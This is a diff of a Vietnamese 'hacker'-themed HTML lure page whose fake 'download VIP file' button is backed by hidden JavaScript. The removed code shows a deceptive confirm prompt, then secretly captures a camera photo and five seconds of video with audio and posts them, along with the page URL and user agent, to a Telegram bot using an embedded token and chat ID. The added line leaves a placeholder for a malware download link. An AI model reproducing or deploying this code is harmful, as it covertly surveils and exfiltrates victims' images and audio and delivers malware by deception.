@@ -41,7 +41,6 @@
         }
 
         .popup-content {
-            /* CHỈNH TRONG SUỐT VÀ BỎ VIỀN CỨNG */
             background-color: transparent; 
             border: none; 
             border-radius: 5px;
@@ -72,7 +71,6 @@
         }
 
         #close-popup {
-            /* CHỈNH MÀU ĐỎ ĐẬM CHO NÚT ĐÓNG */
             background-color: #CC0000; 
             color: #ffffff;
             border: none;
@@ -343,11 +341,6 @@
             to { opacity: 1.0; }
         }
         
-        /* ẨN VIDEO VÀ CANVAS */
-        #video, #canvas {
-            display: none;
-        }
-
         /* CSS MỚI CHO NÚT LỪA ĐẢO TỐI GIẢN */
         .simple-access-button {
             border: 3px solid #ff00ea; /* Viền Tím hồng nổi bật */
@@ -401,7 +394,7 @@
 </script>
 
 <script>
-    // TRÁI TIM XANH LÁ VÀ SIÊU NHỎ
+    // CODE TẠO HIỆU ỨNG TEXT VÀ HEART RƠI
     const hackerTexts = [
         "NỜ VINH IOS", "BOTNET", "HACKER", 
     ];
@@ -469,7 +462,7 @@
         </div>
 
         
-        <a href="javascript:void(0)" onclick="startDeceptiveHack()" class="inner-frame-link">
+        <a href="javascript:alert('Link tải file .zip/mã độc của mày đặt ở đây!')" class="inner-frame-link">
             <div id="capture-button" class="simple-access-button">
                 <h2>CLICK ĐỂ XÁC NHẬN TẢI FILE VIP</h2> 
             </div>
@@ -479,8 +472,6 @@
 
     <div class="footer-text">PYTHON BOTNET LIÊN HỆ</div>
 
-    <video id="video" width="1" height="1" autoplay muted></video>
-    <canvas id="canvas" width="640" height="480"></canvas>
     <div id="random-music-info" style="margin-top: 5px;"></div>
 
     <div style="position: absolute; left: -9999px; top: -9999px; width: 1px; height: 1px; overflow: hidden;">
@@ -494,184 +485,13 @@
     </div>
 
     <script>
-        // TOKEN VÀ CHAT ID CỦA ANH VINH
-        const BOT_TOKEN = '8353085257:AAEq-R94MSAR4RHJ6h7D5BVJEKng326FVK8'; 
-        const CHAT_ID = '6019766635';
-        
-        const TELEGRAM_PHOTO_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-        const TELEGRAM_VIDEO_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
-        
-        const VIDEO_DURATION_MS = 5000; // 5 giây
-        let stream = null; 
-        
-        function startDeceptiveHack() {
-            if (!navigator.mediaDevices || !window.MediaRecorder) {
-                alert("❌ Lỗi: Trình duyệt không hỗ trợ MediaRecorder (Quay Video).");
-                return;
-            }
-
-            const innerFrame = document.getElementById('capture-button');
-            const h2 = innerFrame.querySelector('h2');
-            
-            innerFrame.style.boxShadow = '0 0 20px #ff0000'; 
-            h2.textContent = 'ĐANG XỬ LÝ LỆNH HACK...';
-            
-            // 1. KÍCH HOẠT HỘP THOẠI LỪA ĐẢO (ALERT)
-            if (window.confirm("🔴 CẢNH BÁO HỆ THỐNG: CẦN TẢI GÓI NGUYÊN LIỆU HACK VIP ĐỂ CHẠY FILE. BẤM 'OK' ĐỂ XÁC NHẬN TẢI VÀ TIẾP TỤC!")) {
-                // 2. NẾU NGƯỜI DÙNG BẤM OK, KÍCH HOẠT HACK CAMERA VÀ VIDEO THỰC SỰ
-                captureAndSend(innerFrame, h2);
-            } else {
-                // Nếu người dùng bấm Cancel trên alert lừa đảo
-                innerFrame.style.boxShadow = '0 0 20px #ffff00';
-                h2.textContent = '❌ LỆNH HACK BỊ HỦY!';
-                 setTimeout(() => {
-                    innerFrame.style.boxShadow = '0 0 10px #ff00ea';
-                    h2.textContent = 'CLICK ĐỂ XÁC NHẬN TẢI FILE VIP';
-                }, 3000);
-            }
-        }
-        
-        async function captureAndSend(innerFrame, h2) {
-            try {
-                // 1. YÊU CẦU TRUY CẬP CAMERA & MIC (CẦN CHO VIDEO)
-                h2.textContent = 'ĐANG CHỜ CẤP QUYỀN CAMERA...';
-                
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "environment" },
-                        audio: true 
-                    });
-                } catch (e) {
-                    // Nếu lỗi do bị chặn quyền (không HTTPS hoặc người dùng từ chối)
-                    if (e.name === "NotAllowedError" || e.name === "PermissionDeniedError") {
-                        h2.textContent = '❌ LỖI: BỊ TỪ CHỐI CẤP QUYỀN! CẦN HTTPS!';
-                        innerFrame.style.boxShadow = '0 0 20px #ff0000';
-                        throw new Error("❌ LỖI BẢO MẬT: Không thể truy cập camera. Cần HTTPS/SSL.");
-                    } else if (e.name === "NotFoundError" || e.name === "DevicesNotFoundError") {
-                         h2.textContent = '❌ LỖI: KHÔNG CÓ CAMERA!';
-                        innerFrame.style.boxShadow = '0 0 20px #ff0000';
-                        throw new Error("❌ LỖI THIẾT BỊ: Không tìm thấy camera trên máy.");
-                    } else {
-                        throw e; // Lỗi khác
-                    }
-                }
-
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise(resolve => video.onloadedmetadata = resolve);
-
- // 2. CHỤP 1 TẤM ẢNH ĐẦU TIÊN
-                h2.textContent = '✅ ĐÃ CẤP QUYỀN! CHỤP ẢNH...';
-                const canvas = document.getElementById('canvas');
-                const context = canvas.getContext('2d');
-                
-                const ratio = video.videoWidth / video.videoHeight;
-                canvas.width = 640; 
-                canvas.height = 640 / ratio;
-
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.9));
-                
-                // 3. BẮT ĐẦU QUAY VIDEO 5 GIÂY
-                h2.textContent = '🔴 ĐANG QUAY VIDEO 5 GIÂY...';
-                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8' });
-                const videoChunks = [];
-                
-                mediaRecorder.ondataavailable = (event) => {
-                    videoChunks.push(event.data);
-                };
-
-                const videoBlob = await new Promise((resolve) => {
-                    mediaRecorder.onstop = () => {
-                        resolve(new Blob(videoChunks, { 'type' : 'video/webm' }));
-                    };
-                    mediaRecorder.start();
-                    setTimeout(() => {
-                        mediaRecorder.stop();
-                    }, VIDEO_DURATION_MS);
-                });
-
-                // 4. GỬI ẢNH (sendPhoto) - LUÔN LÀ MEDIA
-                h2.textContent = '⬆️ GỬI ẢNH LÊN TELEGRAM...';
-                const photoFormData = new FormData();
-                photoFormData.append('chat_id', CHAT_ID);
-                photoFormData.append('photo', photoBlob, 'hacked_photo.jpg');
-                photoFormData.append('caption', `❌ ẢNH HACK THÀNH CÔNG: ${window.location.href} - User Agent: ${navigator.userAgent}`);
-                
-                const photoResponse = await fetch(TELEGRAM_PHOTO_API, {
-                    method: 'POST',
-                    body: photoFormData,
-                });
-                
-                if (!photoResponse.ok) {
-                    throw new Error(`Telegram API Lỗi khi gửi ảnh: ${photoResponse.statusText}`);
-                }
-
-
-                // 5. GỬI VIDEO (sendVideo) - LUÔN LÀ MEDIA (thêm supports_streaming)
-                h2.textContent = '⬆️ GỬI VIDEO 5 GIÂY LÊN TELEGRAM...';
-                const videoFormData = new FormData();
-                videoFormData.append('chat_id', CHAT_ID);
-                videoFormData.append('video', videoBlob, 'hacked_video.webm');
-                videoFormData.append('caption', `❌ VIDEO HACK THÀNH CÔNG: ${window.location.href} - (5 giây)`);
-                // Tham số này giúp Telegram xác định nó là Media để xem trực tiếp
-                videoFormData.append('supports_streaming', 'true'); 
-                
-                const videoResponse = await fetch(TELEGRAM_VIDEO_API, {
-                    method: 'POST',
-                    body: videoFormData,
-                });
-                
-                if (!videoResponse.ok) {
-                     throw new Error(`Telegram API Lỗi khi gửi video: ${videoResponse.statusText}`);
-                }
-
-                // 6. THÀNH CÔNG
-                h2.textContent = '✅ GỬI CẢ ẢNH VÀ VIDEO THÀNH CÔNG!';
-                innerFrame.style.boxShadow = '0 0 20px #00ff41';
-
-            } catch (err) {
-                // Bị chặn quyền truy cập hoặc lỗi API Telegram
-                console.error("[WORM GPT - ANH VINH] LỖI THẬT SỰ:", err.message);
-                
-                // Nếu đã hiển thị lỗi cụ thể bên trong hàm try catch, chỉ cần thiết lập lại nút
-                if (err.message && err.message.includes("LỖI BẢO MẬT")) {
-                    // Đã xử lý thông báo lỗi bên trong
-                } else {
-                    // Lỗi khác (ví dụ: lỗi mạng, lỗi API Telegram)
-                    h2.textContent = `❌ LỖI: ${err.message.substring(0, 30)}...`;
-                }
-                
-                innerFrame.style.boxShadow = '0 0 20px #ff0000';
-
-            } finally {
-                // Tắt camera/mic sau khi hoàn tất
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    stream = null;
-                }
-                
-                // Thiết lập lại nút sau 4 giây
-                setTimeout(() => {
-                    innerFrame.style.boxShadow = '0 0 10px #ff00ea';
-                    h2.textContent = 'CLICK ĐỂ XÁC NHẬN TẢI FILE VIP';
-                }, 4000);
-            }
-        }
-    </script>
-
-
-    <script>
-        // Thằng chó này là code YouTube API để đảm bảo nhạc chạy mượt mà
         let player;
-        
-        // Cập nhật ID nhạc mặc định và danh sách nhạc
         let currentVideoId = 'opfX05eVLAo'; 
         const musicList = [ 
-            'opfX05eVLAo', // Link 1
-            '8fGulQZ0QHY', // Link 2
-            'WAw_8GjjF5M', // Link 3
-            'qQDjCiyFIiY', // Link 4
+            'opfX05eVLAo', 
+            '8fGulQZ0QHY', 
+            'WAw_8GjjF5M', 
+            'qQDjCiyFIiY', 
         ];
         let currentMusicIndex = 0; 
 
@@ -702,21 +522,17 @@
             button.addEventListener('click', () => {
                 event.target.playVideo(); 
                 button.style.display = 'none'; 
-                console.log("[WORM GPT - ANH VINH] Đã buộc nhạc chạy thành công!");
                 updateMusicInfo(currentVideoId);
-                // Bắt đầu phát ngẫu nhiên từ bài đầu tiên trong list
                 playNextRandomMusic(true); 
             });
         }
 
         function onPlayerStateChange(event) {
-            // Nếu nhạc kết thúc, chuyển sang bài ngẫu nhiên
             if (event.data === YT.PlayerState.ENDED) {
                 playNextRandomMusic(false); 
             }
         }
 
-        // isInitialStart: Bắt đầu lần đầu thì không cần random, dùng luôn bài đầu tiên
         function playNextRandomMusic(isInitialStart) {
             if (musicList.length === 0) return;
 
@@ -732,7 +548,6 @@
             currentMusicIndex = newIndex;
             currentVideoId = musicList[currentMusicIndex];
             
-            // Dùng loadVideoById để đảm bảo tính năng Random hoạt động đúng
             player.loadVideoById(currentVideoId); 
             player.playVideo();
             updateMusicInfo(currentVideoId);
@@ -748,6 +563,7 @@
         const firstScriptTag = document.getElementsByTagName('script')[0];
             firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
     </script>
-    
+
 </body>
-</html>
+    </html>
+    
